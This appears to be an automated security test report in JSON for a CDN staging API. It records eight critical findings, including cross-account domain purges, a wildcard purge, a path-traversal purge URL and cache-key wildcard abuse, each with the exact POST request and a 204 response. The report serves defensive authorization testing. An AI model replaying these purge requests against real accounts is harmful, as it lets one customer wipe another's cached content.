{
  "totalTests": 15,
  "vulnerabilitiesFound": 8,
  "securityPassed": 0,
  "securityFailed": 8,
  "timestamp": "2025-09-24T14:44:01.831Z",
  "environment": "stage",
  "criticalFindings": [
    {
      "severity": "CRITICAL",
      "type": "Cross-Account Domain Purge",
      "domain": "test-security-domain-1.example.com",
      "description": "Account B successfully purged content for domain test-security-domain-1.example.com owned by Account A",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/url",
          "body": {
            "urls": [
              "https://test-security-domain-1.example.com/test-path"
            ],
            "method": "delete"
          },
          "headers": {
            "Authorization": "Token fake-secondary-token"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Unauthorized users can purge content from domains they do not own",
      "recommendation": "Implement domain ownership validation before allowing purge operations"
    },
    {
      "severity": "CRITICAL",
      "type": "Cross-Account Domain Purge",
      "domain": "test-security-domain-2.azion.net",
      "description": "Account B successfully purged content for domain test-security-domain-2.azion.net owned by Account A",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/url",
          "body": {
            "urls": [
              "https://test-security-domain-2.azion.net/test-path"
            ],
            "method": "delete"
          },
          "headers": {
            "Authorization": "Token fake-secondary-token"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Unauthorized users can purge content from domains they do not own",
      "recommendation": "Implement domain ownership validation before allowing purge operations"
    },
    {
      "severity": "CRITICAL",
      "type": "Cross-Account Domain Purge",
      "domain": "vulnerable-domain.test.com",
      "description": "Account B successfully purged content for domain vulnerable-domain.test.com owned by Account A",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/url",
          "body": {
            "urls": [
              "https://vulnerable-domain.test.com/test-path"
            ],
            "method": "delete"
          },
          "headers": {
            "Authorization": "Token fake-secondary-token"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Unauthorized users can purge content from domains they do not own",
      "recommendation": "Implement domain ownership validation before allowing purge operations"
    },
    {
      "severity": "CRITICAL",
      "type": "Cross-Account Domain Purge",
      "domain": "cross-account-test.domain.org",
      "description": "Account B successfully purged content for domain cross-account-test.domain.org owned by Account A",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/url",
          "body": {
            "urls": [
              "https://cross-account-test.domain.org/test-path"
            ],
            "method": "delete"
          },
          "headers": {
            "Authorization": "Token fake-secondary-token"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Unauthorized users can purge content from domains they do not own",
      "recommendation": "Implement domain ownership validation before allowing purge operations"
    },
    {
      "severity": "CRITICAL",
      "type": "Wildcard Domain Purge",
      "description": "Attempt to purge all subdomains - Attack succeeded",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/url",
          "body": {
            "urls": [
              "https://*.example.com/"
            ],
            "method": "delete"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Advanced purge attack vectors are not properly blocked",
      "recommendation": "Implement comprehensive input validation and domain ownership checks"
    },
    {
      "severity": "CRITICAL",
      "type": "Path Traversal Purge",
      "description": "Attempt path traversal in purge URL - Attack succeeded",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/url",
          "body": {
            "urls": [
              "https://test-security-domain-1.example.com/../../../"
            ],
            "method": "delete"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Advanced purge attack vectors are not properly blocked",
      "recommendation": "Implement comprehensive input validation and domain ownership checks"
    },
    {
      "severity": "CRITICAL",
      "type": "Multiple Domain Purge",
      "description": "Attempt to purge multiple domains in single request - Attack succeeded",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/url",
          "body": {
            "urls": [
              "https://test-security-domain-1.example.com/",
              "https://test-security-domain-2.azion.net/",
              "https://vulnerable-domain.test.com/",
              "https://cross-account-test.domain.org/"
            ],
            "method": "delete"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Advanced purge attack vectors are not properly blocked",
      "recommendation": "Implement comprehensive input validation and domain ownership checks"
    },
    {
      "severity": "CRITICAL",
      "type": "Cache Key Manipulation",
      "description": "Attempt to purge using cache key patterns - Attack succeeded",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://stage-api.azion.com/v4/purge/cachekey",
          "body": {
            "cache_key": "custom-cache-key-*",
            "method": "delete"
          }
        },
        "response": {
          "status": 204
        }
      },
      "impact": "Advanced purge attack vectors are not properly blocked",
      "recommendation": "Implement comprehensive input validation and domain ownership checks"
    }
  ],
  "recommendations": [
    "Implement domain ownership validation before purge operations",
    "Add cross-account access controls for purge endpoints",
    "Implement audit logging for all purge operations",
    "Add rate limiting for purge operations per account",
    "Validate domain ownership against account workloads"
  ]
}